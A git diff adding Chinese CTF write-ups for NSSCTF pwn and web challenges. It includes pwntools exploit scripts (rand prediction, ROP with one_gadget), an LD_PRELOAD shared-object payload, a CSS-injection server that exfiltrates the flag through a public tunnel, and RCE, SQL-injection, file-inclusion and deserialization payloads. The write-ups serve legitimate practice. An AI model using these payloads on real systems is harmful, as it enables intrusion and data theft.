@@ -1864,6 +1864,154 @@ NSSCTF{u_r_master_of_stackoverflow_and_intoverflow}
 
 
 
+### [MoeCTF 2022]random
+
+#### 题目信息
+
+> [MoeCTF 2022]random
+>
+> 321分
+>
+> PWN随机数
+>
+> 
+>
+> 
+>
+> 题目描述
+>
+> ubuntu 16.04
+> 上帝会掷骰子吗?
+> https://github.com/XDSEC/MoeCTF_2022
+
+#### 解题过程
+
+**查看题目**
+
+```c
+__int64 __fastcall main(int a1, char **a2, char **a3)
+{
+  int v3; // ebx
+  int v4; // ebx
+  int v5; // eax
+  int v7; // [rsp+18h] [rbp-68h] BYREF
+  int v8; // [rsp+1Ch] [rbp-64h]
+  char s[32]; // [rsp+20h] [rbp-60h] BYREF
+  unsigned int seed[2]; // [rsp+40h] [rbp-40h]
+  char v11[32]; // [rsp+48h] [rbp-38h] BYREF
+  unsigned __int64 v12; // [rsp+68h] [rbp-18h]
+
+  v12 = __readfsqword(0x28u);
+  setvbuf(stdin, 0, 2, 0);
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(stderr, 0, 2, 0);
+  *(_QWORD *)seed = time(0);
+  memset(s, 0, sizeof(s));
+  memset(v11, 0, sizeof(v11));
+  printf("username: ");
+  read(0, s, 0x20u);
+  printf("password: ");
+  read(0, v11, 0x20u);
+  if ( !strcmp(v11, "ls_4nyth1n9_7ruIy_R4nd0m?") )
+  {
+    printf("Hello, %s\n", s);
+    puts("Let's guest number!");
+    srand(seed[0]);
+    v3 = rand();
+    v4 = rand() ^ v3;
+    v5 = rand();
+    srand(v4 ^ v5);
+    rand();
+    rand();
+    rand();
+    v8 = rand();
+    puts("I've got a number in mind.");
+    puts("If you guess it right, I'll give what you want.");
+    puts("But remember, you have only one chance.");
+    puts("Please tell me the number you guess now.");
+    __isoc99_scanf("%d", &v7);
+    if ( v7 == v8 )
+    {
+      puts("You did it!");
+      puts("Here's your shell");
+      system("/bin/sh");
+    }
+    else
+    {
+      puts("Emmm, seems you're wrong.");
+      puts("Goodbye!");
+    }
+  }
+  else
+  {
+    puts("Permission denied.");
+  }
+  return 0;
+}
+```
+
+**分析**
+
+- 随机数
+
+**最终脚本**
+
+```python
+from pwn import *
+from ctypes import CDLL
+
+r = remote("node5.anna.nssctf.cn", 24644)
+
+payload = "0xdeadbeef".encode()
+r.sendlineafter("username: ".encode(), payload)
+
+payload = "ls_4nyth1n9_7ruIy_R4nd0m?".encode()
+r.sendafter("password: ".encode(), payload)
+
+libc = CDLL("/usr/lib/x86_64-linux-gnu/libc.so.6")
+seed = libc.time(0)
+libc.srand(seed)
+
+v3 = libc.rand()
+v4 = libc.rand() ^ v3
+v5 = libc.rand()
+libc.srand(v4 ^ v5)
+
+libc.rand()
+libc.rand()
+libc.rand()
+v8 = libc.rand()
+
+r.sendlineafter("Please tell me the number you guess now.\n".encode(), str(v8).encode())
+
+r.interactive()
+```
+
+```shell
+┌──(.venv)─(kali㉿kali)-[~/Desktop/ctf]
+└─$ python exp.py
+[+] Opening connection to node5.anna.nssctf.cn on port 24644: Done
+[*] Switching to interactive mode
+You did it!
+Here's your shell
+$ ls
+bin
+dev
+flag
+lib
+lib32
+lib64
+pwn
+$ cat flag
+NSSCTF{2ffdc393-6696-4949-83bd-adc212107ff3}
+```
+
+#### 题目答案
+
+**得到：NSSCTF{2ffdc393-6696-4949-83bd-adc212107ff3}**
+
+
+
 ## WEB
 
 ### [justCTF 2020]gofs
@@ -1912,6 +2060,211 @@ NSSCTF{fb72a9a2-b1e1-4749-99d3-fa35336806d4}
 ```
 
 **得到：NSSCTF{fb72a9a2-b1e1-4749-99d3-fa35336806d4}**
+
+
+
+### [GKCTF 2021]Checkin
+
+#### 题目信息
+
+> [GKCTF 2021]Checkin
+>
+> 
+>
+> 459分
+>
+> PWNleave_retROP
+>
+> 
+>
+> 
+>
+> 题目描述
+>
+> flag以NSSCTF{}形式提交
+
+#### 解题过程
+
+**信息搜集**
+
+```shell
+checksec pwn
+```
+
+```shell
+[*] '/home/kali/Desktop/ctf/pwn/pwn'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+```
+
+**分析**
+
+- Linux64位小端序
+- NX
+
+**查看源码**
+
+```c
+__int64 __fastcall main(__int64 a1, char **a2, char **a3)
+{
+  sub_401815(a1, a2, a3);
+  sub_401876();
+  return 0;
+}
+```
+
+```c
+__int64 sub_401876()
+{
+  puts(s);
+  puts(a135m_0);
+  puts(a135m_1);
+  puts(a135m_2);
+  puts(a135m_3);
+  puts(a135m_4);
+  return sub_4018C7();
+}
+```
+
+```c
+int sub_4018C7()
+{
+  char buf[32]; // [rsp+0h] [rbp-20h] BYREF
+
+  puts("Please Sign-in");
+  putchar(62);
+  read(0, s1, 0x20u);
+  puts("Please input u Pass");
+  putchar(62);
+  read(0, buf, 0x28u);
+  if ( strncmp(s1, "admin", 5u) || (unsigned int)md5_hash(buf) )
+  {
+    puts("Oh no");
+    exit(0);
+  }
+  puts("Sign-in Success");
+  return puts("BaileGeBai");
+}
+```
+
+**分析**
+
+- 通过逆向，**代码审计**，得到**md5_hash**
+- **s1**是一个地址已知的全局变量
+- **read(0, buf, 0x28u)**栈溢出了0x8个字节
+- 思考一下决定，把rop写到s1上，然后使用**leave; ret;**跳到s1执行rop
+- 先泄露**libc_base_addr**，然后通过**one_gadget**来getshell
+- 剩下的细节通过**GDB调试**补充
+
+**数据搜集**
+
+```assembly
+.text:00000000004018B5                 call    _puts
+.text:00000000004018BA                 mov     eax, 0
+.text:00000000004018BF                 call    sub_4018C7
+.text:00000000004018C4                 nop
+.text:00000000004018C5                 leave
+.text:00000000004018C6                 retn
+```
+
+**分析**
+
+- 用这个**puts**不仅可以回跳到**main**
+- 还可以省去很多寄存器造成的未知麻烦
+
+```shell
+one_gadget libc.so.6
+```
+
+```shell
+0x4527a execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  [rsp+0x30] == NULL || {[rsp+0x30], [rsp+0x38], [rsp+0x40], [rsp+0x48], ...} is a valid argv
+
+0xf03a4 execve("/bin/sh", rsp+0x50, environ)
+constraints:
+  [rsp+0x50] == NULL || {[rsp+0x50], [rsp+0x58], [rsp+0x60], [rsp+0x68], ...} is a valid argv
+
+0xf1247 execve("/bin/sh", rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
+```
+
+**分析**
+
+- **one_gadget**是一个很重要的工具，新手还是尽量了解一些
+
+**最终脚本**
+
+```python
+from pwn import *
+
+r = remote("node4.anna.nssctf.cn", 28759)
+
+# r = process(["./pwn"])
+# gdb.attach(r)
+
+libc = ELF("./libc.so.6")
+elf = ELF("./pwn")
+rop = ROP([elf])
+
+puts_elf_addr = 0x4018B5
+
+s1_elf_addr = 0x602400
+
+one_gadget_libc_offset = [0x4527a, 0xf03a4, 0xf1247]
+
+payload = "admin".encode() + '\x00'.encode() * 0x3
+payload += p64(rop.find_gadget(["pop rdi", "ret"])[0]) + p64(elf.got["puts"]) + p64(puts_elf_addr)
+r.sendafter("Please Sign-in\n>".encode(), payload)
+
+payload = "admin".encode() + '\x00'.encode() * 0x3 + '\x00'.encode() * (0x20 - 0x8)
+payload += p64(s1_elf_addr)
+r.sendafter("Please input u Pass\n>".encode(), payload)
+
+puts_got_libc_addr = u64(r.recvuntil('\x7f'.encode())[-6:].ljust(8, '\x00'.encode()))
+libc_base_addr = puts_got_libc_addr - libc.sym["puts"]
+print("libc_base_addr", hex(libc_base_addr))
+
+payload = "admin".encode() + '\x00'.encode() * 0x3
+payload += p64(0) * 2
+payload += p64(libc_base_addr + one_gadget_libc_offset[0])
+r.sendafter("Please Sign-in\n>".encode(), payload)
+
+payload = ("admin".encode() + '\x00'.encode() * 0x3) * 2
+payload += "admin".encode() + '\x00'.encode() * 0x3
+payload += '\x00'.encode() * 0x8
+payload += p64(s1_elf_addr)
+payload += '\x00'.encode() * 0x8
+r.sendafter("Please input u Pass\n>".encode(), payload)
+
+r.interactive()
+r.close()
+```
+
+```shell
+[*] Switching to interactive mode
+Sign-in Success
+BaileGeBai
+$ ls
+bin
+dev
+etc
+flag.txt
+lib
+lib32
+lib64
+pwn
+$ cat flag.txt
+flag{checkin}
+```
+
+#### 题目答案
+
+**得到：NSSCTF{checkin}**
 
 
 
@@ -1966,7 +2319,930 @@ POST id=wllmNB
 NSSCTF{7d56332b-8f46-48c2-8d47-06bc7432d22c}
 ```
 
-**得到：NSSCTF{7d56332b-8f46-48c2-8d47-06bc7432d22c}**
-=======
 **得到：nssctf{L3ak_L1bc_to_g3t_addr3ss_and_ret2_system_b1n5h}**
->>>>>>> origin/master
+
+
+
+### [UUCTF 2022 新生赛]uploadandinject
+
+#### 题目信息
+
+> [UUCTF 2022 新生赛]uploadandinject
+>
+> 193分
+>
+> PHP文件上传WEB
+>
+> 
+>
+> 
+>
+> 题目描述
+>
+> 你的下一张图片何必是一张图片
+
+#### 解题过程
+
+**查看题目**
+
+```shell
+我不会告诉你hint.php里有什么
+```
+
+**尝试解题**
+
+```shell
+hint.php
+```
+
+```shell
+nothing here,but I think you look look JPG,index's swp
+```
+
+```shell
+http://node5.anna.nssctf.cn:21995/.index.php.swp
+```
+
+```shell
+b0VIM 8.0      ?Qc  ?  root                                    VM-4-6-ubuntu                           /tmp/docker/envinject/index.php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              utf-8
+U3210    #"! U                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 tp                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ad  2
+  ?            ?  ?  ?  ?  i  B  ;  3  .    ?  ?  ?  ?  ?  ?  ?  k  9    ?  ?  ?  ?  ?  ?  ?  ?                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ?> }   }     system("echo Failed to load ");   }else{     echo "<br><img src=$img_path>";     system("echo Success to load");     putenv("LD_PRELOAD=/var/www/html/$img_path");   if(file_exists($img_path)){ function loadimg($img_path){ echo "</div>"; loadimg($PATH); echo "<div align='center'>"; }     $PATH="upload/1.jpg"; if((!isset($PATH))){ $PATH=$_GET["image_path"]; EOF; </form> </div>   <input type="submit" value="鍔犺浇">   image_path:<input type="text" name="image_path" value="upload/1.jpg"> <div align="center"> <form action="index.php" method ='GET'> echo <<<EOF <?php 
+```
+
+```shell
+vin -r index.php.swp
+```
+
+```shell
+<?php
+echo <<<EOF
+<form action="index.php" method ='GET'>
+<div align="center">
+  image_path:<input type="text" name="image_path" value="upload/1.jpg">
+  <input type="submit" value="加载">
+</div>
+</form>
+EOF;
+$PATH=$_GET["image_path"];
+if((!isset($PATH))){
+    $PATH="upload/1.jpg";
+}
+echo "<div align='center'>";
+loadimg($PATH);
+echo "</div>";
+function loadimg($img_path){
+  if(file_exists($img_path)){
+    putenv("LD_PRELOAD=/var/www/html/$img_path");
+    system("echo Success to load");
+    echo "<br><img src=$img_path>";
+  }else{
+    system("echo Failed to load ");
+  }
+}
+?>
+```
+
+```cmd
+python dirsearch.py -u http://node5.anna.nssctf.cn:21995/ -e *
+```
+
+```shell
+[19:34:28] 200 -   86B  - /upload/
+[19:34:28] 301 -  338B  - /upload  ->  http://node5.anna.nssctf.cn:21995/upload/
+[19:34:28] 200 -  277B  - /upload/upload.php
+```
+
+**编写脚本**
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+void payload() {
+    //反弹shell
+    system("cat /f*");
+}
+
+char *strcpy (char *__restrict __dest, const char *__restrict __src) {
+    if (getenv("LD_PRELOAD") == NULL) {
+        return 0;
+    }
+    unsetenv("LD_PRELOAD");
+    payload();
+}
+```
+
+```shell
+gcc -shared -fPIC shell.c -o shell.so
+```
+
+```shell
+upload/shell.jpg
+```
+
+```shell
+NSSCTF{e1bde3f3-1531-419c-889d-5edb39b3f667} Success to load
+```
+
+#### 题目答案
+
+**得到：NSSCTF{e1bde3f3-1531-419c-889d-5edb39b3f667}**
+
+
+
+### [安洵杯 2019]CSS Game
+
+#### 题目信息
+
+> [安洵杯 2019]CSS Game
+>
+> 479分
+>
+> WEBCSS注入XSS
+>
+> 
+>
+> 
+>
+> 题目描述
+>
+> 无描述
+
+#### 解题过程
+
+**查看源码**
+
+```html
+<html>
+<head>
+    <meta charset="utf8" />
+    <title>CSS Game</title>
+    <style>
+
+    </style>
+</head>
+<body>
+<h1>CSS Game</h1>
+<p>
+    The flag is in <code>http://127.0.0.1:60000/flag.html</code>
+</p>
+<p>
+    flag.html
+    <!--
+        <html>
+            <link rel="stylesheet" href="${encodeURI(req.query.css)}" />
+             <form>
+                <input name="Email" type="text" value="test">
+                <input name="flag" type="hidden" value="202cb962ac59075b964b07152d234b70"/>
+                <input type="submit" value="提交">
+            </form>
+        </html>
+    -->
+</p>
+<form action="/crawl.html" method="post">
+    http://127.0.0.1:60000/flag.html?css=<input type="text" name="css" />
+    <input type="submit"/><br><br>
+</form>
+</body>
+</p>
+```
+
+**分析**
+
+- **CSS盲注本地文件内容**
+
+- **爆破核心：**
+
+  ```shell
+  input[name=flag][value^="待爆破字符串"] ~ * {background-image:url("回显host:port/已知串");}
+  ```
+
+**编写盲注脚本**
+
+**app.py**
+
+```python
+from flask import Flask, Response, request
+
+app = Flask(__name__)
+
+dic = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}-_"
+result = ""
+BAD_PREFIXES = ["favicon.ico", "robots.txt", "index"]
+
+@app.route('/poc.css')
+def generate_css():
+    global result
+    css_content = ""
+    for char in dic:
+        current_prefix = result + char
+        css_content += f'input[name="flag"][value^="{current_prefix}"] {{background: url("/check?prefix={current_prefix}");}}\n'
+    return Response(css_content, mimetype="text/css")
+
+@app.route('/check')
+def check_flag():
+    global result
+    prefix = request.args.get('prefix', '')
+    
+    if any(bad in prefix for bad in BAD_PREFIXES):
+        return ""
+    
+    if len(prefix) > len(result) and prefix.startswith(result):
+        result = prefix
+        print(f"{result}")
+        if result.endswith('}'):
+            print(result)
+    return ""
+
+@app.route('/favicon.ico')
+def favicon():
+    return "", 204
+
+if __name__ == '__main__':
+    app.run(host='127.0.0.1', port=8000, debug=False)
+```
+
+**内网穿透**
+
+**config.ini**
+
+```shell
+[default]
+authtoken=[你natapp隧道的token]
+clientip=127.0.0.1
+clientport=8000
+```
+
+```shell
+natapp.exe
+```
+
+```shell
+Powered By NATAPP       Please visit https://natapp.cn                                                  (Ctrl+C to Quit)
+
+Tunnel Status           Online
+
+Version                 3.0.1
+
+Forwarding              http://u6265ecc.natappfree.cc -> http://127.0.0.1:8000
+
+Web Interface           http://127.0.0.1:4040
+
+Total Connections       42
+```
+
+**开放端口**
+
+```shell
+python -m http.server 8000
+```
+
+```shell
+Serving HTTP on :: port 8000 (http://[::]:8000/) ...
+```
+
+**运行脚本**
+
+```shell
+python app.py
+```
+
+```shell
+ * Serving Flask app 'app'
+ * Debug mode: off
+```
+
+**执行爆破**
+
+```shell
+?css=http://u6265ecc.natappfree.cc/poc.css
+```
+
+#### 题目答案
+
+```shell
+NSSCTF{d3729e9
+127.0.0.1 - - [19/Mar/2026 20:35:40] "GET /check?prefix=NSSCTF{d3729e9 HTTP/1.1" 200 -
+127.0.0.1 - - [19/Mar/2026 20:36:34] "GET /poc.css HTTP/1.1" 200 -
+NSSCTF{d3729e9a
+127.0.0.1 - - [19/Mar/2026 20:36:34] "GET /check?prefix=NSSCTF{d3729e9a HTTP/1.1" 200 -
+```
+
+**得到：NSSCTF{d3729e9a...}**
+
+
+
+### [SCTF 2021]loginme
+
+#### 题目信息
+
+> [SCTF 2021]loginme
+>
+> 
+>
+> 1分
+>
+> SSTI代码审计WEB
+>
+> 
+>
+> 
+>
+> 题目描述
+>
+> I don't know the age of the admin, can you tell me?
+> By the way, admin's Password maybe the thing you want
+> 得到的flag使用NSSCTF{}格式提交。
+
+#### 解题过程
+
+```shell
+http://node4.anna.nssctf.cn:25280/admin/index?id=0&age={{.Password}}
+```
+
+```shell
+X-Real-IP: 127.0.0.1
+```
+
+```shell
+Hello Admin
+Your Age: SCTF{E@zy_SIGn_Ch3eR!}
+```
+
+#### 题目答案
+
+**得到：NSSCTF{E@zy_SIGn_Ch3eR!}**
+
+
+
+### [SWPUCTF 2021 新生赛]easyrce
+
+#### 题目信息
+
+> [SWPUCTF 2021 新生赛]easyrce
+>
+> 
+>
+> 1分
+>
+> RCEPHP无回显RCE
+>
+> 
+>
+> 
+>
+> 题目描述
+>
+> 无描述
+
+#### 解题过程
+
+**查看题目**
+
+```php
+<?php
+error_reporting(0);
+highlight_file(__FILE__);
+if(isset($_GET['url']))
+{
+eval($_GET['url']);
+}
+?>
+```
+
+#### 题目答案
+
+```shell
+?url=system('cat /f*');
+```
+
+```shell
+NSSCTF{f8a319d9-34d2-40b2-bf0c-f35a0e1f3ae8}
+```
+
+**得到：NSSCTF{f8a319d9-34d2-40b2-bf0c-f35a0e1f3ae8}**
+
+
+
+### [SWPUCTF 2021 新生赛]caidao
+
+#### 题目信息
+
+> [SWPUCTF 2021 新生赛]caidao
+>
+> 
+>
+> 1分
+>
+> RCEPHP信息收集
+>
+> 
+>
+> 
+>
+> 题目描述
+>
+> 无描述
+
+#### 解题过程
+
+**查看题目**
+
+```shell
+@eval($_POST['wllm']);
+```
+
+**分析**
+
+- **用POST发送请求**
+- **键为wllm**
+- **值为system('cat /f*');**
+- **注意加`;`**
+
+#### 题目答案
+
+```shell
+wllm=system('cat /f*');
+```
+
+```shell
+NSSCTF{e843f9f6-5a65-4ead-9120-b2516b58adee}
+```
+
+**得到：NSSCTF{e843f9f6-5a65-4ead-9120-b2516b58adee}**
+
+
+
+### [SWPUCTF 2021 新生赛]gift_F12
+
+#### 题目信息
+
+> [SWPUCTF 2021 新生赛]gift_F12
+>
+> 1分
+>
+> 信息收集JS分析源码泄漏
+>
+> 
+>
+> 
+>
+> 题目描述
+>
+> flag以NSSCTF{}形式提交
+
+#### 解题过程
+
+**查看源码**
+
+```js
+<script language="javascript">
+    function show_date_time() {
+        flag = "WLLMCTF{We1c0me_t0_WLLMCTF_Th1s_1s_th3_G1ft}"//flag is here
+```
+
+#### 题目答案
+
+**得到：NSSCTF{We1c0me_t0_WLLMCTF_Th1s_1s_th3_G1ft}**
+
+
+
+### [SWPUCTF 2021 新生赛]easy_md5
+
+#### 题目信息
+
+> [SWPUCTF 2021 新生赛]easy_md5
+>
+> 1分
+>
+> 弱比较PHP数组绕过
+>
+> 
+>
+> 
+>
+> 题目描述
+>
+> 无描述
+
+#### 解题过程
+
+**查看题目**
+
+```php
+<?php 
+ highlight_file(__FILE__);
+ include 'flag2.php';
+ 
+if (isset($_GET['name']) && isset($_POST['password'])){
+    $name = $_GET['name'];
+    $password = $_POST['password'];
+    if ($name != $password && md5($name) == md5($password)){
+        echo $flag;
+    }
+    else {
+        echo "wrong!";
+    }
+ 
+}
+else {
+    echo 'wrong!';
+}
+?>
+```
+
+**分析**
+
+- **$name != $password && md5($name) == md5($password)**
+- **md5弱碰撞**
+
+#### 题目答案
+
+**数组绕过**
+
+```shell
+http://node7.anna.nssctf.cn:27160/?name[]=0
+POST password[]=1
+```
+
+```shell
+NSSCTF{bc983573-629c-4055-b07e-9307566a8eba}
+```
+
+**得到：NSSCTF{bc983573-629c-4055-b07e-9307566a8eba}**
+
+
+
+### [SWPUCTF 2021 新生赛]include
+
+#### 题目信息
+
+> [SWPUCTF 2021 新生赛]include
+>
+> 1分
+>
+> PHP伪协议PHP文件包含
+>
+> 
+>
+> 
+>
+> 题目描述
+>
+> 无描述
+
+#### 解题过程
+
+**查看题目**
+
+```shell
+传入一个file试试
+```
+
+```shell
+http://node7.anna.nssctf.cn:22382/?file
+```
+
+```php
+<?php
+ini_set("allow_url_include","on");
+header("Content-type: text/html; charset=utf-8");
+error_reporting(0);
+$file=$_GET['file'];
+if(isset($file)){
+    show_source(__FILE__);
+    echo 'flag 在flag.php中';
+}else{
+    echo "传入一个file试试";
+}
+echo "</br>";
+echo "</br>";
+echo "</br>";
+echo "</br>";
+echo "</br>";
+include_once($file);
+?> flag 在flag.php中
+```
+
+**分析**
+
+- **include_once($file)**
+- **文件包含漏洞**
+
+#### 题目答案
+
+**最终请求**
+
+```shell
+http://node7.anna.nssctf.cn:22382/?file=php://filter/convert.base64-encode/resource=flag.php
+```
+
+```shell
+PD9waHANCiRmbGFnPSdOU1NDVEZ7M2RmMTE0ZjktNjFmOS00YTljLTlhODktZGJjZGY3MDZiMGU1fSc7
+```
+
+```shell
+<?php
+$flag='NSSCTF{3df114f9-61f9-4a9c-9a89-dbcdf706b0e5}';
+```
+
+**得到：NSSCTF{3df114f9-61f9-4a9c-9a89-dbcdf706b0e5}**
+
+
+
+### [SWPUCTF 2021 新生赛]easy_sql
+
+#### 题目信息
+
+> [SWPUCTF 2021 新生赛]easy_sql
+>
+> 1分
+>
+> SQL注入报错注入布尔盲注
+>
+> 
+>
+> 
+>
+> 题目描述
+>
+> 无描述
+
+#### 解题过程
+
+```sql
+' or true --+
+' order by 3 --+
+' union select 1,2,database() --+
+' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='test_db' --+
+' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='test_db' --+
+' union select 1,2,flag from test_tb --+
+```
+
+```shell
+Your Password:NSSCTF{853611b0-db76-4401-a325-660da243140d}
+```
+
+#### 题目答案
+
+**得到：NSSCTF{853611b0-db76-4401-a325-660da243140d}**
+
+
+
+### [LitCTF 2023]我Flag呢？
+
+#### 题目信息
+
+> [LitCTF 2023]我Flag呢？
+>
+> 1分
+>
+> 信息收集源码泄漏代码审计
+>
+> 
+>
+> 
+>
+> 题目描述
+>
+> 奇怪，放哪里了，怎么看不见呢？（初级难度）
+
+#### 解题过程
+
+**查看源码**
+
+```shell
+F12+I || 鼠标右键+检查
+点击源码
+代码审计
+```
+
+```shell
+<!--flag is here flag=NSSCTF{03e06097-2698-44db-884b-bb872db1d484} -->
+```
+
+#### 题目答案
+
+**得到：NSSCTF{03e06097-2698-44db-884b-bb872db1d484}**
+
+
+
+### [suctf 2019]EasySQL
+
+#### 题目信息
+
+> [suctf 2019]EasySQL
+>
+> 1分
+>
+> 堆叠注入SQL注入关键字绕过
+>
+> 
+>
+> 
+>
+> 题目描述
+>
+> 该题目复现环境尚未取得主办方及出题人相关授权，如果侵权，请联系管理员删除。
+
+#### 解题过程
+
+**查看题目**
+
+```shell
+Give me your flag, I will tell you if the flag is right.
+```
+
+**分析**
+
+- 常规**`'`**不行
+- 宽体注入不行
+- 尝试堆叠注入
+
+#### 题目答案
+
+```shell
+9;set sql_mode=PIPES_AS_CONCAT;select 9
+```
+
+```shell
+Array ( [0] => 9 ) Array ( [0] => 9NSSCTF{57838d87-4ce7-488a-ad01-7b90dec5e95e} )
+```
+
+**分析**
+
+- 关于sql_mode：https://www.cnblogs.com/piperck/p/9835695.html
+
+**得到：NSSCTF{57838d87-4ce7-488a-ad01-7b90dec5e95e}**
+
+
+
+### [SWPUCTF 2021 新生赛]Do_you_know_http
+
+#### 题目信息
+
+> [SWPUCTF 2021 新生赛]Do_you_know_http
+>
+> 
+>
+> 1分
+>
+> HTTP协议信息收集PHP
+>
+> 
+>
+> 
+>
+> 题目描述
+>
+> 无描述
+
+#### 解题过程
+
+**查看题目**
+
+```shell
+使用WLLM浏览器
+```
+
+```
+User-Agent WLLM
+```
+
+```shell
+使用本地地址
+```
+
+```shell
+X-Forwarded-For 127.0.0.1
+```
+
+#### 题目答案
+
+**得到：NSSCTF{4aaf61e3-4e08-49bc-bb64-da134869bebe}**
+
+
+
+### [SWPUCTF 2021 新生赛]ez_unserialize
+
+#### 题目信息
+
+> [SWPUCTF 2021 新生赛]ez_unserialize
+>
+> 1分
+>
+> 反序列化PHPJava反序列化
+>
+> 
+>
+> 
+>
+> 题目描述
+>
+> 无描述
+
+#### 解题过程
+
+**查看题目**
+
+```shell
+/robots.txt
+```
+
+```shell
+User-agent: *
+Disallow: /cl45s.php
+```
+
+```shell
+/cl45s.php
+```
+
+```shell
+<?php
+
+error_reporting(0);
+show_source("cl45s.php");
+
+class wllm{
+
+    public $admin;
+    public $passwd;
+
+    public function __construct(){
+        $this->admin ="user";
+        $this->passwd = "123456";
+    }
+
+        public function __destruct(){
+        if($this->admin === "admin" && $this->passwd === "ctf"){
+            include("flag.php");
+            echo $flag;
+        }else{
+            echo $this->admin;
+            echo $this->passwd;
+            echo "Just a bit more!";
+        }
+    }
+}
+
+$p = $_GET['p'];
+unserialize($p);
+
+?>
+```
+
+**编写脚本**
+
+```php
+<?php
+class wllm{
+
+    public $admin;
+    public $passwd;
+
+    public function __construct(){
+        $this->admin ="user";
+        $this->passwd = "123456";
+    }
+
+        public function __destruct(){
+        if($this->admin === "admin" && $this->passwd === "ctf"){
+            include("flag.php");
+            echo $flag;
+        }else{
+            echo $this->admin;
+            echo $this->passwd;
+            echo "Just a bit more!";
+        }
+    }
+}
+
+$p = new wllm();
+$p->admin = "admin";
+$p->passwd = "ctf";
+echo serialize($p);
+?>
+```
+
+```shell
+O:4:"wllm":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:3:"ctf";}
+Warning: include(flag.php): failed to open stream: No such file or directory in /box/script.php on line 14
+
+Warning: include(): Failed opening 'flag.php' for inclusion (include_path='.:') in /box/script.php on line 14
+```
+
+**发送请求**
+
+```shell
+?p=O:4:"wllm":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:3:"ctf";}
+```
+
+```shell
+NSSCTF{d41e5569-12e1-4fed-9872-a766065ec184}
+```
+
+#### 题目答案
+
+**得到：NSSCTF{d41e5569-12e1-4fed-9872-a766065ec184}**
